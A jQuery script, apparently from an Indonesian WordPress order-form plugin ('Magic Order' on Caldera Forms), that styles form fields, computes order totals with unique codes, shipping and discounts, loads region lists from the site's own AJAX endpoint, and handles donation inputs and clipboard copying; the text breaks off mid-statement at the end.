jQuery(document).ready(function ($) {
  var lh = location.href;
  var lh_get = lh.substring(lh.indexOf("?") + 1);
  var tp_link = $("#btn_konfirmasi").attr("href");
  var tp_link_value = tp_link + "?" + lh_get;
  $("#btn_konfirmasi").attr("href", tp_link_value);

  count_option = $(".jumlah_pilihan option").length - 1;
  for (r = 1; r <= count_option; r++) {
    $(".pilihan" + r).hide();
    $(".pilihan" + r + " select option:first").addClass("first-option");
  }

  $(".jumlah_pilihan").bind("change", function (e) {
    var jumlah = parseFloat($(this).find(":selected").val());
    for (r = 1; r <= count_option; r++) {
      if (r <= jumlah) {
        $(".pilihan" + r).show();
      } else {
        $(".pilihan" + r).hide();
        var id_field_pilihan = $(".pilihan" + r)
          .map(function () {
            return this.id;
          })
          .get();
        var str_array = id_field_pilihan.toString().split(",");
        for (var i = 0; i < str_array.length; i++) {
          // Trim the excess whitespace.
          str_array[i] = str_array[i].replace(/^\s*/, "").replace(/\s*$/, "");
          console.log("ID: " + str_array[i]);
          // clear all value with ID section
          $("#" + str_array[i] + " select option:first").prop("selected", true);
          $("#" + str_array[i] + " input")
            .val("")
            .attr("value", "");
          $("#" + str_array[i] + " textarea")
            .val("")
            .attr("value", "");
          $("#" + str_array[i] + " input").attr("checked", false); // Unchecks it
          $("#" + str_array[i] + " label").removeClass("mgo-radio-selected");
        }
      }
    }
  });

  // new style radio card
  $(".form-group .radio").each(function () {
    var id_field = $(this).find("input").attr("data-radio-field");
    var id_fieldnya = id_field + "-wrap";
    var id_radio_input = $(this).find("input:radio:checked").attr("id");

    if (id_radio_input != undefined) {
      $(this).find("label").addClass("mgo-radio-selected");
    }
  });

  $(document).on("click", ".form-group .radio label", function (e) {
    var id_field = $(this).find("input").attr("data-radio-field");
    var id_fieldnya = id_field + "-wrap";
    var id_radio_input = $(this).find("input").attr("id");
    $("#" + id_fieldnya + " .radio label").removeClass("mgo-radio-selected");
    $(this).addClass("mgo-radio-selected");
  });

  $(document).on("click", ".form-group label.radio-inline", function (e) {
    var id_field = $(this).find("input").attr("data-radio-field");
    var id_fieldnya = id_field + "-wrap";
    var id_radio_input = $(this).find("input").attr("id");
    $("#" + id_fieldnya + " label.radio-inline").removeClass(
      "mgo-radio-selected"
    );
    $(this).addClass("mgo-radio-selected");
  });

  // end new style radio card

  // add switch to checkbox
  // $('.checkbox label').addClass('mgo_switch2');
  // $('label.mgo_switch2').append('<div class="mgo_slider2 round"></div>');

  $(".checkbox").addClass("mgo_checkbox");
  $(".checkbox label input").addClass("check-custom");
  $(".checkbox label").append('<span class="check-toggle"></span>');

  $(".mgo_anonim .checkbox label").addClass("mgo_switch");
  $(".mgo_anonim label.mgo_switch").append(
    '<div class="mgo_slider round"></div>'
  );
  $(".mgo_anonim .check-toggle").remove();
  $(".mgo_anonim .checkbox label").removeClass("mgo_checkbox");
  $(".mgo_anonim .checkbox input").removeClass("check-custom");

  $(".set_switch .checkbox label").addClass("mgo_switch");
  $(".set_switch label.mgo_switch").append(
    '<div class="mgo_slider round"></div>'
  );
  $(".set_switch .check-toggle").remove();
  $(".set_switch .checkbox label").removeClass("mgo_checkbox");
  $(".set_switch .checkbox input").removeClass("check-custom");
  // end swtich

  // adding to calera form
  $(".mgo_total").append(
    '<div class="mgo-caldera"><div class="clearfix"><div class="divsection"><section class="one itemtotal">Item Total</section><section class="two itemtotal">Rp 0</section></div><div class="divsection"><section class="one ppn">Item Total</section><section class="two ppn">Rp 0</section></div><div class="divsection"><section class="one ongkir">Ongkir</section><section class="two ongkir">Rp 0</section></div><div class="divsection"><section class="one diskon">Diskon</section><section class="two diskon">Rp 0</section></div><div class="divsection"><section class="one diskon2">Diskon</section><section class="two diskon2">Rp 0</section></div><div class="divsection"><section class="one kodeunik">Kode Unik</section><section class="two kodeunik">Rp 0</section></div><div class="divsection"><section class="one addcost">Add Cost</section><section class="two addcost">Rp 0</section></div><div class="divsection"><section class="three"><div class="dashed"></div></section></div><div class="divsection"><section class="one total">TOTAL</section><section class="two total">Rp 0</section></div></div></div>'
  );
  var label_total = $(".mgo_total label").text();
  if (label_total != "") {
    $(".mgo-caldera .one.total").text(label_total);
  }

  // *****************
  // Link Followup
  // *****************
  var id_followup1 = $(".followup1").attr("id");
  if (id_followup1 != null) {
    var fix_mgo_orderid =
      object_name.templateUrl +
      "/?followup1=" +
      orderid_form +
      "&entryid=byemail";
    $("#" + id_followup1).val(fix_mgo_orderid);
    $("#" + id_followup1).attr("value", fix_mgo_orderid);
  }
  var id_followup2 = $(".followup2").attr("id");
  if (id_followup2 != null) {
    var fix_mgo_orderid =
      object_name.templateUrl +
      "/?followup2=" +
      orderid_form +
      "&entryid=byemail";
    $("#" + id_followup2).val(fix_mgo_orderid);
    $("#" + id_followup2).attr("value", fix_mgo_orderid);
  }
  var id_followup3 = $(".followup3").attr("id");
  if (id_followup3 != null) {
    var fix_mgo_orderid =
      object_name.templateUrl +
      "/?followup3=" +
      orderid_form +
      "&entryid=byemail";
    $("#" + id_followup3).val(fix_mgo_orderid);
    $("#" + id_followup3).attr("value", fix_mgo_orderid);
  }

  if (object_name.pageP == "1") {
    var newstyle = document.createElement("style");
    document.head.appendChild(newstyle);
    newstyle.sheet.insertRule(
      "body {-webkit-touch-callout: none;-webkit-user-select: none;-khtml-user-select: none;-moz-user-select: none;-ms-user-select: none;user-select: none;}"
    );
    document.addEventListener("contextmenu", (event) => event.preventDefault());
  }

  // ************************
  // KODE UNIK
  // ************************
  var label_kodeunik_min = $(".mgo_codemin label").text();
  var label_kodeunik_plus = $(".mgo_codeplus label").text();
  var label_kodeunik_3dwa = $(".mgo_code3dwa label").text();
  var label_kodeunik_2dwa = $(".mgo_code2dwa label").text();
  var label_kodeunik_fixed = $(".mgo_codefixed label").text();
  set_hide_kodeunik = false;
  if (label_kodeunik_min != "") {
    $(".mgo-caldera .one.kodeunik").text(label_kodeunik_min);
    $(".mgo_codemin").hide();
  } else if (label_kodeunik_plus != "") {
    $(".mgo-caldera .one.kodeunik").text(label_kodeunik_plus);
    $(".mgo_codeplus").hide();
  } else if (label_kodeunik_3dwa != "") {
    $(".mgo-caldera .one.kodeunik").text(label_kodeunik_3dwa);
    $(".mgo_code3dwa").hide();
  } else if (label_kodeunik_2dwa != "") {
    $(".mgo-caldera .one.kodeunik").text(label_kodeunik_2dwa);
    $(".mgo_code2dwa").hide();
  } else if (label_kodeunik_fixed != "") {
    $(".mgo-caldera .one.kodeunik").text(label_kodeunik_fixed);
    $(".mgo_codefixed").hide();
  } else {
    $(".mgo-caldera .one.kodeunik").hide();
    $(".mgo-caldera .two.kodeunik").hide();
    set_hide_kodeunik = true;
  }

  // HIDE PEMBAYARAN
  var id_payment = $(".mgo_pembayaran.set_hide").attr("id");
  if (id_payment != null) {
    $(".mgo_pembayaran.set_hide").hide();
  }

  // ************************
  // SET HIDE | TOTAL
  // ************************
  var id_total_default = $(".mgo_total.set_default").attr("id");
  if (id_total_default == null) {
    $(".mgo_total label").hide();
    $(".mgo_total input").hide();
  } else {
    $(".mgo-caldera").hide();
  }

  var id_total_hide = $(".mgo_total.set_hide").attr("id");
  if (id_total_hide != null) {
    $(".mgo_total.set_hide").hide();
  }

  // Special case
  $(".set_hide_field").hide();

  // ONGKIR HIDE - RO
  var id_ongkir_hide_ro = $(".mgo_ongkoskirim.set_hide").attr("id");
  if (id_ongkir_hide_ro != null) {
    $(".mgo_ongkoskirim").hide();
    $(".mgo-caldera .one.ongkir").hide();
    $(".mgo-caldera .two.ongkir").hide();
  }
  var id_ongkir_hide_mgo = $(".mgo_ongkir.set_hide").attr("id");
  if (id_ongkir_hide_mgo != null) {
    $(".mgo_ongkir").hide();
    $(".mgo-caldera .one.ongkir").hide();
    $(".mgo-caldera .two.ongkir").hide();
  }

  // DISKON TEXT
  var label_diskon = $(".mgo_diskon label").text();
  if (label_diskon != "") {
    $(".mgo-caldera .one.diskon").text(label_diskon);
    $(".mgo_diskon").hide();
  } else {
    $(".mgo-caldera .one.diskon").hide();
    $(".mgo-caldera .two.diskon").hide();
  }

  // DISKON PERSEN TEXT
  var label_diskon2 = $(".mgo_diskon_persen label").text();
  if (label_diskon2 != "") {
    $(".mgo-caldera .one.diskon2").text(label_diskon2);
    $(".mgo_diskon_persen").hide();
  } else {
    $(".mgo-caldera .one.diskon2").hide();
    $(".mgo-caldera .two.diskon2").hide();
  }

  // ADD COST
  label_addcost = $(".mgo_addcost_persen label").text();
  if (label_addcost != "") {
    $(".mgo-caldera .one.addcost").text(label_addcost);
    $(".mgo_addcost_persen").hide();
  } else {
    $(".mgo-caldera .one.addcost").hide();
    $(".mgo-caldera .two.addcost").hide();
  }

  // PPN
  var label_ppn = $(".mgo_ppn label").text();
  if (label_ppn != "") {
    $(".mgo-caldera .one.ppn").text(label_ppn);
    $(".mgo_ppn").hide();
  } else {
    $(".mgo-caldera .one.ppn").hide();
    $(".mgo-caldera .two.ppn").hide();
  }

  // KODE UNIK SHOW
  var id_codemin_show = $(".mgo_codemin.set_show").attr("id");
  if (id_codemin_show != null) {
    $(".mgo_codemin").show();
  }
  var id_codeplus_show = $(".mgo_codeplus.set_show").attr("id");
  if (id_codeplus_show != null) {
    $(".mgo_codeplus").show();
  }
  var id_code3dwa_show = $(".mgo_code3dwa.set_show").attr("id");
  if (id_code3dwa_show != null) {
    $(".mgo_code3dwa").show();
  }
  var id_code2dwa_show = $(".mgo_code2dwa.set_show").attr("id");
  if (id_code2dwa_show != null) {
    $(".mgo_code2dwa").show();
  }
  var id_codefixed_show = $(".mgo_codefixed.set_show").attr("id");
  if (id_codefixed_show != null) {
    $(".mgo_codefixed").show();
  }

  function getRandomIntMin(min, max) {
    return (Math.floor(Math.random() * (max - min + 1)) + min) * -1;
  }
  function getRandomIntPlus(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }

  random_min = getRandomIntMin(1, 1000);
  random_plus = getRandomIntPlus(1, 1000);
  nilai_kodeunik = 0;
  nilai_kodeunik_public = 0;

  id_codemin = "";
  var id_mgo_codemin = $(".mgo_codemin").attr("id");
  if (id_mgo_codemin != null) {
    var fields_mgo_codemin = id_mgo_codemin.split("-wrap");
    id_codemin = fields_mgo_codemin[0];
    document.getElementById(id_codemin).readOnly = true;
    if (object_name.license == "FREEMIUM") {
      $(".mgo_codemin input").val(0).attr("value", 0);
      $(".mgo-caldera .two.kodeunik").text("Rp " + 0);
      nilai_kodeunik = 0;
      nilai_kodeunik_public = 0;
    } else {
      $(".mgo_codemin input").val(random_min).attr("value", random_min);
      $(".mgo-caldera .two.kodeunik").text("Rp " + random_min);
      nilai_kodeunik = random_min;
      nilai_kodeunik_public = random_min;
    }
  }

  id_codeplus = "";
  var id_mgo_codeplus = $(".mgo_codeplus").attr("id");
  if (id_mgo_codeplus != null) {
    var fields_mgo_codeplus = id_mgo_codeplus.split("-wrap");
    id_codeplus = fields_mgo_codeplus[0];
    document.getElementById(id_codeplus).readOnly = true;
    if (object_name.license == "FREEMIUM") {
      $(".mgo_codeplus input").val(0).attr("value", 0);
      $(".mgo-caldera .two.kodeunik").text("Rp " + 0);
      nilai_kodeunik = 0;
      nilai_kodeunik_public = 0;
    } else {
      $(".mgo_codeplus input").val(random_plus).attr("value", random_plus);
      $(".mgo-caldera .two.kodeunik").text("Rp " + random_plus);
      nilai_kodeunik = random_plus;
      nilai_kodeunik_public = random_plus;
    }
  }

  id_code3dwa = "";
  var id_mgo_code3dwa = $(".mgo_code3dwa").attr("id");
  if (id_mgo_code3dwa != null) {
    var fields_mgo_code3dwa = id_mgo_code3dwa.split("-wrap");
    id_code3dwa = fields_mgo_code3dwa[0];
    document.getElementById(id_code3dwa).readOnly = true;
    $(".mgo_code3dwa input").val(0).attr("value", 0);
    $(".mgo-caldera .two.kodeunik").text("Rp " + 0);
    nilai_kodeunik = 0;
    nilai_kodeunik_public = 0;
  }

  id_code2dwa = "";
  var id_mgo_code2dwa = $(".mgo_code2dwa").attr("id");
  if (id_mgo_code2dwa != null) {
    var fields_mgo_code2dwa = id_mgo_code2dwa.split("-wrap");
    id_code2dwa = fields_mgo_code2dwa[0];
    document.getElementById(id_code2dwa).readOnly = true;
    $(".mgo_code2dwa input").val(0).attr("value", 0);
    $(".mgo-caldera .two.kodeunik").text("Rp " + 0);
    nilai_kodeunik = 0;
    nilai_kodeunik_public = 0;
  }

  id_codefixed = "";
  var id_mgo_codefixed = $(".mgo_codefixed").attr("id");
  if (id_mgo_codefixed != null) {
    var fields_mgo_codefixed = id_mgo_codefixed.split("-wrap");
    id_codefixed = fields_mgo_codefixed[0];
    document.getElementById(id_codefixed).readOnly = true;
    var nilai_kodenya = $(".mgo_codefixed input").val();
    $(".mgo-caldera .two.kodeunik").text("Rp " + nilai_kodenya);
    nilai_kodeunik = nilai_kodenya;
    nilai_kodeunik_public = nilai_kodenya;
  }

  $(".mgo_wa input").bind("change", function (e) {
    if (object_name.license != "FREEMIUM") {
      var wa_number = $(this).val();
      if (id_code3dwa != "") {
        var tigadigitwa = wa_number.substr(wa_number.length - 3);
        $(".mgo_code3dwa input").val(tigadigitwa).attr("value", tigadigitwa);
        $(".mgo-caldera .two.kodeunik").text("Rp " + tigadigitwa);
        nilai_kodeunik = tigadigitwa;
        nilai_kodeunik_public = tigadigitwa;
      }

      if (id_code2dwa != "") {
        var duadigitwa = wa_number.substr(wa_number.length - 2);
        $(".mgo_code2dwa input").val(duadigitwa).attr("value", duadigitwa);
        $(".mgo-caldera .two.kodeunik").text("Rp " + duadigitwa);
        nilai_kodeunik = duadigitwa;
        nilai_kodeunik_public = duadigitwa;
      }
    }
  });

  // check payment transfer or cod with condition kode unik and biaya admin
  var text_cod = "COD";
  nama_banknya = "";
  nama_banknya = $(".mgo_pembayaran label")
    .find(".payment-active span")
    .data("bank");
  if (nama_banknya != null) {
    if (nama_banknya.indexOf(text_cod) !== -1) {
      $(".addcost").show();
      $(".kodeunik").hide();
      $(".mgo_codemin input").val(0).attr("value", 0);
      $(".mgo_codeplus input").val(0).attr("value", 0);
      $(".mgo_code3dwa input").val(0).attr("value", 0);
      $(".mgo_code2dwa input").val(0).attr("value", 0);
      $(".mgo_codefixed input").val(0).attr("value", 0);
      $(".mgo-caldera .two.kodeunik").text("Rp " + 0);
      nilai_kodeunik = 0;
    } else {
      $(".addcost").hide();
      if (set_hide_kodeunik == true) {
        $(".kodeunik").hide();
      } else {
        $(".kodeunik").show();
      }
      $(".mgo_codemin input")
        .val(nilai_kodeunik_public)
        .attr("value", nilai_kodeunik_public);
      $(".mgo_codeplus input")
        .val(nilai_kodeunik_public)
        .attr("value", nilai_kodeunik_public);
      $(".mgo_code3dwa input")
        .val(nilai_kodeunik_public)
        .attr("value", nilai_kodeunik_public);
      $(".mgo_code2dwa input")
        .val(nilai_kodeunik_public)
        .attr("value", nilai_kodeunik_public);
      $(".mgo_codefixed input")
        .val(nilai_kodeunik_public)
        .attr("value", nilai_kodeunik_public);
      $(".mgo-caldera .two.kodeunik").text("Rp " + nilai_kodeunik_public);
      nilai_kodeunik = nilai_kodeunik_public;
    }
  } else {
    $(".addcost").hide();
    if (set_hide_kodeunik == true) {
      $(".kodeunik").hide();
    } else {
      $(".kodeunik").show();
    }
    $(".mgo_codemin input")
      .val(nilai_kodeunik_public)
      .attr("value", nilai_kodeunik_public);
    $(".mgo_codeplus input")
      .val(nilai_kodeunik_public)
      .attr("value", nilai_kodeunik_public);
    $(".mgo_code3dwa input")
      .val(nilai_kodeunik_public)
      .attr("value", nilai_kodeunik_public);
    $(".mgo_code2dwa input")
      .val(nilai_kodeunik_public)
      .attr("value", nilai_kodeunik_public);
    $(".mgo_codefixed input")
      .val(nilai_kodeunik_public)
      .attr("value", nilai_kodeunik_public);
    $(".mgo-caldera .two.kodeunik").text("Rp " + nilai_kodeunik_public);
    nilai_kodeunik = nilai_kodeunik_public;
  }

  $(".mgo_kecamatan_auto input").bind("change", function (e) {
    setTimeout(function () {
      check_kecamatan();
    }, 800);
  });

  function check_kecamatan() {
    var val_kecamatan = $(".mgo_kecamatan_auto input").val();
    var arr_k = val_kecamatan.split(",");
    if (arr_k[2] == null) {
      $(".mgo_kecamatan_auto input").addClass("set_red");
      $(".mgo_kecamatan_auto input").val("");
      // $(".mgo_kecamatan_auto input").attr("placeholder", "Ketik kecamatan dan wajib memilih yang keluar dari sistem.");
      alert("Ketik kecamatan dan wajib memilih yang keluar dari sistem.");
    } else {
      $(".mgo_kecamatan_auto input").removeClass("set_red");
    }
  }

  jumlah_barang = 1;
  $(".mgo_jumlah_barang select").bind("change", function (e) {
    jumlah_barang = $(this).val();
    if (jumlah_barang == "") {
      jumlah_barang = 1;
    }
  });

  // ************************
  // ONGKIR
  // ************************
  id_ongkir = "";
  id_ongkir_label = "";
  var id_mgo_ongkirnya = $(".mgo_ongkoskirim").attr("id");
  if (id_mgo_ongkirnya != null) {
    // set ID Ongkir
    var fields_mgo_ongkir = id_mgo_ongkirnya.split("-wrap");
    id_ongkir = fields_mgo_ongkir[0];
    // set ID Label
    var fields_mgo_ongkir_label = id_mgo_ongkirnya.split("_1-wrap");
    id_ongkir_label = fields_mgo_ongkir_label[0];

    $("#" + id_ongkir).prop("disabled", "disabled");
  }

  // Provinsi
  id_provinsi = "";
  var id_mgo_provinsi = $(".mgo_provinsi select").attr("id");
  if (id_mgo_provinsi != null) {
    var fields_mgo_provinsi = id_mgo_provinsi.split("-wrap");
    id_provinsi = fields_mgo_provinsi[0];
  }

  // kabkota
  id_kabkota = "";
  var id_mgo_kabkota = $(".mgo_kabkota select").attr("id");
  if (id_mgo_kabkota != null) {
    var fields_mgo_kabkota = id_mgo_kabkota.split("-wrap");
    id_kabkota = fields_mgo_kabkota[0];
    $("#" + id_kabkota).prop("disabled", "disabled");
  }

  var label_ongkir = $(".mgo_ongkir label").text();
  var label_ongkir2 = $("#" + id_ongkir_label + "Label").text();

  if (label_ongkir2 != "") {
    $(".mgo-caldera .one.ongkir").text(label_ongkir2);
  } else if (label_ongkir != "") {
    $(".mgo-caldera .one.ongkir").text(label_ongkir);
    // $(".mgo_ongkir").hide();
  } else {
    $(".mgo-caldera .one.ongkir").hide();
    $(".mgo-caldera .two.ongkir").hide();
  }

  // GET DATA PROVINSI TO SERVER
  id_caldera_form2 = "";
  var caldera_form2 = $(".caldera_forms_form").attr("id");
  if (caldera_form2 != null) {
    var fields_caldera_form2 = caldera_form2.split("_");
    id_caldera_form2 = fields_caldera_form2[0];

    if (object_name.license != "FREEMIUM") {
      if (id_provinsi != "") {
        $(".mgo_provinsi label img").show();
        var data_nya = [id_caldera_form2];
        var data = {
          action: "myaction_get_provinsi",
          datanya: data_nya,
        };
        jQuery.post(
          object_name.templateUrl + "/wp-admin/admin-ajax.php",
          data,
          function (response) {
            $("#" + id_provinsi)
              .children()
              .remove();
            $("#" + id_provinsi).append(response);

            $(".mgo_provinsi label img").hide();
          }
        );
      }
    }

    // cek view diskon
    var cek_diskon = $(".mgo_diskon label").text();
    if (cek_diskon == "") {
      $(".mgo-caldera .one.diskon").hide();
      $(".mgo-caldera .two.diskon").hide();
    }
  }

  // DONASI
  var id_donasi_utama = $(".mgo_donasi_utama").attr("id");
  var id_donasi_lainnya = $(".mgo_donasi").attr("id");
  nilai_donasi_utama = 0;
  if (id_donasi_utama != null) {
    $(".mgo_donasi").hide();
  }
  $(".mgo_donasi_utama label").bind("change", function (e) {
    nilai_donasi_utama = $(this).find("input").attr("data-calc-value");
    if (nilai_donasi_utama == 0) {
      $(this).find("input").val("");
      $(".mgo_donasi").show();
    } else {
      $(".mgo_donasi").hide();
      $(".mgo_donasi input").val("").attr("value", "");
    }
  });

  var id_formnya = $(".caldera_forms_form").attr("id");
  if (id_formnya != null) {
    var string = $("#" + id_formnya).html();
    if (string.indexOf("mgo_donasi") !== -1) {
      $("#" + id_formnya + ' input[type="submit"]').bind("click", function (e) {
        donasi_lainnya = parseFloat(
          $(".mgo_donasi input").val().replace(/\./g, "")
        );
        donasi_lainnya_val = $(".mgo_donasi input").val();
        donasi_lainnya_minimal = parseFloat(
          $(".mgo_donasi input").attr("placeholder")
        );
        nilai_donasi_utama = $(".mgo_donasi_utama")
          .find(".mgo-radio-selected input")
          .attr("data-calc-value");

        if (donasi_lainnya_val == "" && nilai_donasi_utama == 0) {
          $("html, body").animate(
            {
              scrollTop: $("#" + id_donasi_lainnya).offset().top,
            },
            2000
          );
          alert("Maaf, jangan lupa isi donasi anda.");
          $(".donasi").addClass("set_red");
          e.preventDefault();
        }

        if (donasi_lainnya != "") {
          if (donasi_lainnya < donasi_lainnya_minimal) {
            $("html, body").animate(
              {
                scrollTop: $("#" + id_donasi_lainnya).offset().top,
              },
              2000
            );
            alert(
              "Maaf, Minimal donasi Rp " + addCommas(donasi_lainnya_minimal)
            );
            $(".donasi").addClass("set_red");
            e.preventDefault();
          }
        }
      });
    }
  }

  $(".mgo_donasi input")
    .addClass("donasi")
    .after("<div class='text_rp'>Rp</div>");

  // $('.mgo_donasi input').addClass("jumlah_donasi").after("<input class='form-control donasi' type='tel' value='' /><div class='text_rp'>Rp</div>").hide();

  // $('.mgo_donasi input.donasi').keyup(function(event) {
  //   if(event.which >= 37 && event.which <= 40) return;
  //   $(this).val(function(index, value) {
  //     return value.replace(/\D/g, "").replace(/\B(?=(\d{3})+(?!\d))/g, ".");
  //   });

  // });

  $(".mgo_donasi input").keyup(function (event) {
    if (event.which >= 37 && event.which <= 40) return;
    $(this).val(function (index, value) {
      return value.replace(/\D/g, "").replace(/\B(?=(\d{3})+(?!\d))/g, ".");
    });
  });

  donasi_utamanya = 0;
  $(".mgo_donasi input").bind("change", function (e) {
    // alert(1);
    donasinya = $(this).val();
    donasi_utamanya = donasinya.replace(/\./g, "");
    // alert(donasi_utamanya);
    // $('.mgo_donasi input.jumlah_donasi').val(donasinya).attr("value",donasinya);
  });

  // Add footer Mgo
  if (object_name.poweredBy == "1") {
    $(".caldera-grid").append(
      '<div class="powered-mgo-box"><img class="powered-mgo-img" src="' +
        object_name.pluginUrl +
        'assets/icons/magic-order-30.png" alt="Magic Order 3.0">Powered by Magic Order</div>'
    );
  }

  // add validasi form with processing info and disabled button
  var id_formnya_ = $(".caldera_forms_form").attr("id");
  if (id_formnya_ != null) {
    $(document).on(
      "click",
      "#" + id_formnya_ + ' input[type="submit"]',
      function (e) {
        var form = $(this).parents("form:first");
        form.submit(function () {
          $("#" + id_formnya_ + ' input[type="submit"]')
            .prop("disabled", true)
            .val("Processing...");
        });
      }
    );
  }

  // NEW THANKYOU PAGE
  $(".mgo_thanks_page_box2").prepend(
    '<div class="mgo_alert top_right"><p class="alert_container"></p></div>'
  );

  $(document).on("click", ".mgo_copy_total", function (e) {
    var nilai_total = $("#get_mgo_total").text();
    var hasil_angka = nilai_total.match(/\d/g);
    hasil_angka = hasil_angka.join("");
    copyToClipboard2(hasil_angka);
    $(".mgo_alert")
      .html(
        '<div class="icon_checklist"></div><div style="margin-top: 4px;font-size: 13px;">Total <span style="font-weight: bold;">' +
          hasil_angka +
          "</span> berhasil <br>dicopy.</div>"
      )
      .slideToggle();
    setTimeout(function () {
      $(".mgo_alert").slideUp(200);
    }, 2000);
  });

  $(document).on("click", ".mgo_copy_deposit", function (e) {
    var nilai_total = $("#get_mgo_deposit").text();
    var hasil_angka = nilai_total.match(/\d/g);
    hasil_angka = hasil_angka.join("");
    copyToClipboard2(hasil_angka);
    $(".mgo_alert")
      .html(
        '<div class="icon_checklist"></div><div style="margin-top: 4px;font-size: 13px;">Total <span style="font-weight: bold;">' +
          hasil_angka +
          "</span> berhasil <br>dicopy.</div>"
      )
      .slideToggle();
    setTimeout(function () {
      $(".mgo_alert").slideUp(200);
    }, 2000);
  });

  $(document).on("click", ".mgo_copy_dp", function (e) {
    var nilai_total = $("#get_mgo_dp").text();
    var hasil_angka = nilai_total.match(/\d/g);
    hasil_angka = hasil_angka.join("");
    copyToClipboard2(hasil_angka);
    $(".mgo_alert")
      .html(
        '<div class="icon_checklist"></div><div style="margin-top: 4px;font-size: 13px;">Total <span style="font-weight: bold;">' +
          hasil_angka +
          "</span> berhasil <br>dicopy.</div>"
      )
      .slideToggle();
    setTimeout(function () {
      $(".mgo_alert").slideUp(200);
    }, 2000);
  });

  $(document).on("click", ".mgo_copy_rek", function (e) {
    var nilai_total = $(".mgo_bank_text").text();
    var hasil_angka = nilai_total.match(/\d/g);
    hasil_angka = hasil_angka.join("");
    copyToClipboard2(hasil_angka);
    $(".mgo_alert")
      .html(
        '<div class="icon_checklist"></div><div style="margin-top: 4px;font-size: 13px;">Rekening <span style="font-weight: bold;">' +
          hasil_angka +
          "</span> berhasil dicopy.</div>"
      )
      .slideToggle();
    setTimeout(function () {
      $(".mgo_alert").slideUp(200);
    }, 2000);
  });

  // get Copy
  function copyToClipboard2(string) {
    let textarea;
    let result;
    try {
      textarea = document.createElement("textarea");
      textarea.setAttribute("readonly", !0);
      textarea.setAttribute("contenteditable", !0);
      textarea.style.position = "fixed";
      textarea.value = string;
      document.body.appendChild(textarea);
      textarea.focus();
      textarea.select();
      const range = document.createRange();
      range.selectNodeContents(textarea);
      const sel = window.getSelection();
      sel.removeAllRanges();
      sel.addRange(range);
      textarea.setSelectionRange(0, textarea.value.length);
      result = document.execCommand("copy");
    } catch (err) {
      console.error(err);
      result = null;
    } finally {
      document.body.removeChild(textarea);
    }
    if (!result) {
      const isMac = navigator.platform.toUpperCase().indexOf("MAC") >= 0;
      const copyHotkey = isMac ? "⌘C" : "CTRL+C";
      result = prompt(`Press ${copyHotkey}`, string);
      if (!result) {
        return !1;
      }
    }
    return !0;
  }

  // GET DATA KABKOTA TO SERVER
  // $(document).on("change", "#"+id_provinsi, function(e) {
  $("#" + id_provinsi).bind("change", function (e) {
    if (id_kabkota != "") {
      $(".mgo_kabkota label img").show();
      id_provinsi_selected = $(this).find(":selected").data("idprovinsi");

      var data_nya = [id_provinsi_selected];
      var data = {
        action: "myaction_get_kabkota",
        datanya: data_nya,
      };
      jQuery.post(
        object_name.templateUrl + "/wp-admin/admin-ajax.php",
        data,
        function (response) {
          $("#" + id_kabkota)
            .children()
            .remove();
          $("#" + id_kabkota).append(response);
          $("#" + id_kabkota).prop("disabled", false);
          $("#" + id_kec).prop("disabled", "disabled");
          $("#" + id_kec)
            .children()
            .remove();
          $("#" + id_ongkir)
            .val(0)
            .attr("value", 0);
          hargaongkir = 0;
          $(".mgo_total .mgo-caldera .two.ongkir").text(
            "Rp " + addCommas(hargaongkir)
          );

          $(".mgo_kabkota label img").hide();
        }
      );
    }
  });

  // GET DATA KECAMATAN TO SERVER
  // $(document).on("change", "#"+id_kabkota, function(e) {
  $("#" + id_kabkota).bind("change", function (e) {
    if (id_kec != "") {
      $(".mgo_kecamatan label img").show();
      id_kabkota_selected = $(this).find(":selected").data("idkabkota");

      var data_nya = [id_kabkota_selected];
      var data = {
        action: "myaction_get_kec",
        datanya: data_nya,
      };
      jQuery.post(
        object_name.templateUrl + "/wp-admin/admin-ajax.php",
        data,
        function (response) {
          $("#" + id_kec)
            .children()
            .remove();
          $("#" + id_kec).append(response);
          $("#" + id_kec).prop("disabled", false);
          $("#" + id_ongkir)
            .val(0)
            .attr("value", 0);
          hargaongkir = 0;
          $(".mgo_total .mgo-caldera .two.ongkir").text(
            "Rp " + addCommas(hargaongkir)
          );

          $(".mgo_kecamatan label img").hide();
        }
      );
    }
  });

  // set class option_ongkir
  $(".mgo_ongkoskirim div").first().addClass("option_ongkir");

  $(".option_ongkir").html(
    "<div class='radio'><label data-label='' for='c6wa_'><input id='c6wa_' class='fld_360_1' data-field='fld_360' name='fld_360' value='0' data-radio-field='fld_360' data-type='radio' data-calc-value='0' type='radio' disabled></label></div>"
  );

  // jx
  /*
	function getUrlParameter3(t){var a,r,e=decodeURIComponent(window.location.search.substring(1)).split("&");for(r=0;r<e.length;r++)
if((a=e[r].split("="))[0]===t)return void 0===a[1]||a[1]}
var ver_code=$(".title_verification").attr("id");if(ver_code!=null){var orderidnya=getUrlParameter3("mgo_orderid");var phone_number=getUrlParameter3("mgo_wa");var namanya=getUrlParameter3("mgo_nama");if(phone_number!=null&&orderidnya!=null&&namanya!=null){var data_nya=[orderidnya,phone_number,namanya];var data={"action":"myaction_generate_sendcode","datanya":data_nya};jQuery.post(object_name.templateUrl+"/wp-admin/admin-ajax.php",data,function(response){})}}
var count=30;var timer=null;countDownTimer();$('#kirim_ulang_kode').bind("click",function(e){$('#form_resend').show();$(this).slideUp();$('#count').text('');count=0});$('.mgo_wa.auto_send input').bind("blur",function(e){var orderidnya=$('.mgo_orderid input').val();if(orderidnya==null){var orderidnya=$('input.mgo_orderid').val()}
var phone_number=$('.mgo_wa.auto_send input').val();var namanya=$('.mgo_nama input').val();var data_nya=[orderidnya,phone_number,namanya];var data={"action":"myaction_generate_sendcode","datanya":data_nya};jQuery.post(object_name.templateUrl+"/wp-admin/admin-ajax.php",data,function(response){})});$('.input_phone').val(getUrlParameter3("mgo_wa"));$('#resend').bind("click",function(e){$(this).attr('disabled','disabled');count=60;timer=null;countDownTimer();var phone_number=$('.input_phone').val();var orderidnya=getUrlParameter3("mgo_orderid");var namanya=getUrlParameter3("mgo_nama");var data_nya=[orderidnya,phone_number,namanya];var data={"action":"myaction_sendcode","datanya":data_nya};jQuery.post(object_name.templateUrl+"/wp-admin/admin-ajax.php",data,function(response){$('.info_resend').html('Kode verifikasi berhasil dikirimkan,<br>cek Inbox SMS handphone anda.').show();setTimeout(function(){$('.info_resend').hide()},10000)})});function countDownTimer(){$('#resend').attr('disabled','disabled');$('#count').text('('+count+'s)');if(count!==0){timer=setTimeout(countDownTimer,1000);count--}else{$('#resend').prop("disabled",!1);$('#count').text('')}};(function(){var 